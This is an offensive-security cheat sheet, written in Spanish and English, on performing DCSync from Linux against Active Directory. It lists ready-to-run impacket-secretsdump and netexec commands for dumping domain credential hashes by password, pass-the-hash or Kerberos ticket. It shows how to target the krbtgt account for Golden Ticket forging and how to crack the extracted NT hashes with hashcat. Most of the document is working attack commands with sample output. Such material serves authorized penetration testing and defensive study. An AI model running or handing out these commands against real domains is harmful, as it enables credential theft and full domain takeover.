---
aliases:
  - DCSync Linux
  - secretsdump DCSync
  - impacket dcsync
tags:
  - type/technique
  - technique/credential-access
  - env/linux
  - asset/active-directory
  - cred/ntlm
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[DCSync]]'
---
# DCSync - Linux Execution

***

## impacket-secretsdump — Full NT dump

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump corp/admin:pass@DC -just-dc-ntlm` | Solo NT hashes — output compacto | Standard PtH prep / hashcat. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc` | NT + AES128/256 + cleartext si reversible | Kerberos keys needed. |
| `impacket-secretsdump corp/admin:pass@DC` | Full — NTDS + SAM + LSA Secrets | Todo en uno. |
| `impacket-secretsdump corp/admin:pass@DC -outputfile out` | Guarda en `out.ntds`, `out.ntds.kerberos` | Pipeline / save. |
^dcsync-linux-full

```bash
# Standard — solo NT hashes
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm

# Full con AES keys (para Silver/Golden Ticket forging)
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc -outputfile corp_dump
```

___

## impacket-secretsdump — Targeted

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump corp/admin:pass@DC -just-dc-user krbtgt` | krbtgt hash + AES keys | Golden Ticket prep. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc-user administrator` | Built-in admin hash | PtH directo. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc-user 'corp\\svc_backup'` | Service account específico | Targeted. |
^dcsync-linux-targeted

```bash
# Extraer solo krbtgt (Golden Ticket material)
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local \
  -just-dc-user krbtgt

# Output:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:XXXXXXXX:::
# [*] Kerberos keys grabbed
# corp.local\krbtgt:aes256-cts-hmac-sha1-96:YYYYYYYY...
# corp.local\krbtgt:aes128-cts-hmac-sha1-96:ZZZZZZZZ...
```

___

## impacket-secretsdump — Pass-the-Hash

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump -hashes :NTHASH corp/admin@DC -just-dc-ntlm` | Full NT dump via PtH | Sin password. |
| `impacket-secretsdump -hashes LM:NT corp/admin@DC -just-dc-ntlm` | Full NT dump (LM puede ser vacío) | Con hash completo. |
| `impacket-secretsdump -hashes :NT corp/admin@DC -just-dc-user krbtgt` | krbtgt targeted via PtH | Golden Ticket. |
^dcsync-linux-pth

```bash
# LM vacío = aad3b435b51404eeaad3b435b51404ee
impacket-secretsdump \
  -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 \
  corp.local/administrator@dc01.corp.local \
  -just-dc-ntlm
```

___

## impacket-secretsdump — Kerberos ticket

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `export KRB5CCNAME=ticket.ccache && impacket-secretsdump -k -no-pass corp/admin@DC.corp.local -just-dc-ntlm` | Full dump via Kerberos auth | Con PtT activo. |
| `impacket-secretsdump -k -no-pass corp/admin@DC.corp.local -just-dc-user krbtgt` | krbtgt via ticket | Targeted PtT. |
^dcsync-linux-kerberos

```bash
# Con ticket inyectado (impacket-getTGT o PtT)
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local -just-dc-ntlm

# Requiere FQDN — no IP
```

___

## nxc / netexec --ntds

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb DC -u admin -p pass --ntds` | Full NT hashes | Preferred — output limpio. |
| `nxc smb DC -u admin -H NT --ntds` | Full dump via PtH | Sin password. |
| `nxc smb DC -u admin -p pass --ntds drsuapi` | Forzar DCSync method | Explícito. |
| `nxc smb DC -u admin -p pass --ntds --enabled` | Solo accounts habilitadas | Cleaner. |
^dcsync-linux-nxc

```bash
nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds --enabled
# Output en ~/.nxc/logs/
```

___

## Output format

| **Formato** | **Ejemplo** | **Uso** |
|:---:|:---:|:---:|
| secretsdump estándar | `corp.local\admin:500:LM:NT:::` | `user:RID:LM:NT:::` |
| NT hash solo | `5f4dcc3b5aa765d61d8327deb882cf99` | hashcat `-m 1000` |
| AES256 | `corp.local\krbtgt:aes256-cts-hmac-sha1-96:HEXHEX` | Golden/Silver forge |
| AES128 | `corp.local\krbtgt:aes128-cts-hmac-sha1-96:HEXHEX` | Kerberos auth |
^dcsync-linux-output

```bash
# Extraer solo NT hashes para hashcat
grep ":::" corp_dump.ntds | cut -d: -f4 | sort -u > nt_hashes.txt

# Buscar accounts de alto valor
grep -i "admin\|krbtgt\|svc_\|:500:" corp_dump.ntds

# hashcat
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt
```

***
